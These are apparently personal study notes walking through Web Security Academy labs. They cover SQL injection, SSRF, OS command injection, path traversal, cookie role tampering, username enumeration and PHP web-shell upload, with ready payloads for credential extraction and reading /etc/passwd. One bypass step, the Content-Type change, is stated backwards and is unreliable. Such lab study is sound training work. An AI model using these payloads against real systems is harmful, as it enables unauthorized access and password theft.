# Web Security Academy

## SQL injection

> SQL injection is a cybersecurity attack technique where malicious SQL code is inserted into input fields of a web application, exploiting vulnerabilities in the application's handling of SQL queries.

### Check SQL injection vulnerability in WHERE clause - Apprentice

```
# original query

SELECT * FROM products WHERE category = 'Gifts' AND release = 1

# TEST

# SQLi payload = '--

# Injected query
SELECT * FROM products WHERE category = '--

# Interpreted query
SELECT * FROM products WHERE category = ''

# SQLi payload = ' or 1=1--
SELECT * FROM products WHERE category = '' or 1=1--
```

### SQLi vulnerabily allowing login bypass - Apprentice

```
# perform SQLi attack and login as "administrator" user

# original query

SELECT firstname FROM users WHERE username = 'administrator' AND password = 'secretpasswd'

# TEST

#SQLi payload = '--

SELECT firstname FROM users WHERE username = 'administrator'--
```

### SQLi UNION attack - Practitioner

#### Union operator:

```
table1
a | b
1 , 2
3 , 4

table2
c | d
2 , 3
4 , 5

select a,b from table1

1,2
3,4

select a,b from table1 UNION select c,d from table2

1,2
3,4
2,3
4,5

```

> Rule:
>
> 1. The number and the order of the columns must be the same in all queries
> 2. The data types must be compatible

#### SQLi way 1:

```
select ? from table1' UNION select NULL--
# error -> incorrect number of columns

select ? from table1' UNION select NULL, NULL, NUll--
# 200 response code -> correct number of columns
```

#### SQLi way 2:

```
# increment the order by number (x) until you get an error (it means the number of columns is equals to x-1)
select ? from table1' order by 3--
```

#### Check the columns type

```
# because of rule 2, we can easily check the type of a column like this:
# let's say the one below is table1:

a | b
1 , mario

select a, b from table1' UNION select NULL, 'a'--
# if no error occurs, it means the second column of table1 is of type text and the result of the query will be:

1 , mario
2 , a
```

### Retrieve data from other tables - Practitioner

```
# As soon as we discover the number of columns for a specific table and its columns type, we can proceed with the following UNION attack:

# SLQi payload = ' UNION select username, password from users--
select a, b from products where category = 'Gifts' UNION select username, password from users--

```

### Retrieve multiple values in a single column - Practitioner

```
# As soon as we discover the number of columns for a specific table and its columns type, we can proceed

# in order to print multiple values in a single column, we need to use the string concatenation operator. Since there is a different syntax based on the db type, we need to check it before proceeding (check the cheet sheet for checking the db version)

# let's suppose we are dealing with a PostrgeSQL db, we can inject the following SQLi payload for retrieving username and password in a single column

' UNION select NULL, username || * || password from users--

# where the || is the concat operator and * is a separator of our choice to understand where the username text ends and the password's starts
```

### Blind SQL Injection with conditional responses - Practitioner

> Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as UNION attacks are not effective with blind SQL injection vulnerabilities.

#### 1. Check that the parameter is vulnerable to SQLi

```
# if the Cookie: TrackingId is TRUE, it returns "Welcome back!"

Cookie: TrackingId=xyz' and 1=1--

# check no "Welcome Back!" if FALSE

Cookie: TrackingId=xyz' and 1=2--
```

#### 2. Check the existence of a user table

```
# without the LIMIT 1, the query would have print as much 'x' as the number of rows in users

Cookie: TrackingId=xyz' and (SELECT 'x' FROM users LIMIT 1)='x'--

SELECT 'x' FROM users
```

#### 3. Confirm that username "administrator" exists in the "users" table

```
Cookie: TrackingId=xyz' and (SELECT username FROM users where username='administrator')='administrator'--
```

#### 4. Enumerate the password of the administrator user

```
TRUE CASE

Cookie: TrackingId=xyz' and (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>1)='administrator'--

FALSE CASE

Cookie: TrackingId=xyz' and (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>50)='administrator'--
```

It's possible to enumerate the length number by sending the request to the Intruder and using a Numbers paylod type. Then by checking the length of the response, we can deduce that the exact length is 20.

```
TEST CASE

Cookie: TrackingId=xyz' and (SELECT username FROM users WHERE username='administrator' and LENGTH(password)=20)='administrator'--

```

Now we know the exact length of the password, it's time to brute force it.

```
# we are going to use a sniper attack with a brute forcer payload type in order to try all the alphanumerical chars

Cookie: TrackingId=xyz' and (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

```

In order to discover the password faster, we are gonna use a Cluster Bomb attack for iterating on both the first index of the substring and the characters of the password.

## Server-side request forgery (SSRF)

> SSRF is a cybersecurity vulnerability that allows an attacker to send crafted requests from a vulnerable server to other internal or external resources, potentially bypassing security measures and accessing sensitive information or services.

### Basic SSRF against another BE system - Apprentice

After using the Burp's interceptor on the target website, we found a _stockApi_ payload in the POST request after clicking the "Check stock" button:

```
# decoded result

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

Now we want to scan the internal 192.168.0.x range for an admin interface on port 8080 and use it to delete the user _carlos_

In order to achieve that we send the request to the intruder and use the payload position to the 'x'. Then we use a payload of type number for iterating from 1 to 255.

When the attack gets completed, we notice a 404 (Not Found) response for the x=190, meaning that there is a server responding on 192.168.0.190.

Now we access to the admin interface on `stockApi=http://192.168.0.190:8080/admin` where we can delete the user _carlos_

## OS command injection - Apprentice

> OS command injection is a cybersecurity vulnerability that occurs when an attacker can execute arbitrary operating system commands on a server or application by manipulating input data.

After using the Burp's interceptor on the target website, we found a `productId=1&storeId=1` payload in the POST request after clicking the "Check stock" button.

```
# For checking for OS command injection, we edit the payload like that:

productId=1 & whoami #`

# where the '#' is a comment in bash scripting. We receive the following response:

peter

# meaning the website is vulnerable to OS command injection
```

## Directory traversal - Apprentice

> Directory Traversal Vulnerability, also known as Path Traversal, is a cybersecurity weakness that allows an attacker to access files or directories outside the intended directory structure of a web application.

After using Burp's interceptor on the target website and after navigating to a Shop section, we didn't find anything useful in the list of requests. But we can filter the the request by MIME type and check the 'images' checkbox for intercept them too.

Now we have the images request in the Burp's interceptor list, we pick one of them and send to the repeater.

Here we found a GET request like this:

`GET /image?filename=42.jpg` HTTP/1.1

Since that image is stored somewhere on a server, we can assume there is a Linux server running.
So we try to access the `/etc/passwd` by changing the request like that:

`GET /image?filename=../../../../../../../../../../etc/passwd` HTTP/1.1

Sometimes the realtive path is blocked, but the absolute path is working:

`GET /image?filename=/etc/passwd` HTTP/1.1

Sometimes the ../ is not allowed but a possible workaround is to use another ../ before it:

`GET /image?filename=....//....//....//....//....//....//....//etc/passwd` HTTP/1.1

## Access control vulnerabilities

Access control vulnerability in cybersecurity refers to weaknesses or flaws in the mechanisms designed to regulate and restrict access to sensitive data, systems, or resources within a network or application.

### Unprotected admin functionality - Apprentice

Try to see if you can access the _robots.txt_ file by appending `/robots.txt` in the URL.

> The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show on their search engine results

After accessing the `/robots.txt` file we found something like that:

```
User-agent: *
Allow: /
Disallow: /administration-panel
```

We found the `/administration-panel` endpoint allowing us to access panel administration page.

### Unpredictable URL - Apprentice

Sometimes the `/robots.txt` endpoint is not accessible but some hidden endpoints are written in clear in the source code, so by just inspecting it we can find hidden pages.

### User role controlled by request parameter - Apprentice

Another vulnerability can be caused by cookies. If the server responde with a `set-cookie:admin=true`, it means the client is did the access as admin and from the next time on (until the cookie expires or the user manually delete it from the browser) the client will send the `cookie:admin=true` or `cookie:admin=false` depending on the user login.

Using Burp Suite, we can exploit that vulnerability by altering the cookie at will.

## Authentication

### Username enumeration - Apprentice

- Go to a login form in the target website and login with some credentials ("test", "password")
- Then interecpt the POST request in Burp Suite and send it to the Intruder
- Here, let's perfeorm a username enumerations by setting the payload position to "test" and using a Sniper attack
- In the _Payload_ tab set the _Simple list_ entry and import a list of usernames
- Let's start the attack and check the length of the results
- all the results have a length of 3102, but only one have the length set to 3104
- if we inspect the response of one result with the 3102 length, we notice a "Invalid username" in the HTML response code
- the only result with 3104, instead, have a "Invalid password" message, meaning the username in this iteration was correct
- Now that we have the username, we can perform a dictionary attack with a password list for that username

## File upload vulnerabilities

### Remote code execution via shell upload - Apprentice

- We have e form in the target website in which we can upload an image for changing our profile picture
- We interept both the POST request and the GET request (that retrieves the uploaded image)

```
# the POST request looks like this:

POST /my-account/avatar HTTP/1.1
..
..
Content-Disposition: form-data; name="avatar"; filename="cat.jpg"
Content-Type: image/jpeg

**the unreadable image here**

# The GET request looks like this:

GET /my-account/avatar/cat.jpg HTTP/1.1

# Now we replace both the payload and the filename like this

Content-Disposition: form-data; name="avatar"; filename="myexploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/etc/passwd'); ?>

# We run the request and we get the following response "The file avatar/myexploit.php has been uploaded"

# Now we run the GET for retrieve the image (the exploit code in this case)

GET /my-account/avatar/myexploit.php HTTP/1.1

# the /etc/passwd is successfully printed in the response
```

### Web shell upload via Content-Type restriction bypass - Apprentice

We do the same step as above, but this time we are not able to upload the _myexploit.php_ file.

The error we receive is the following: **Sorry, file type application/x-php is not allowed. Only image/jpg and image/png are allowed.**

In this case, the workaround was to just change the `Content-Type` in the request, from `image/jpeg` to `application/x-php` meaning there is no control about the file type that is actually sent, but the only control is the `Content-Type` value in the header.
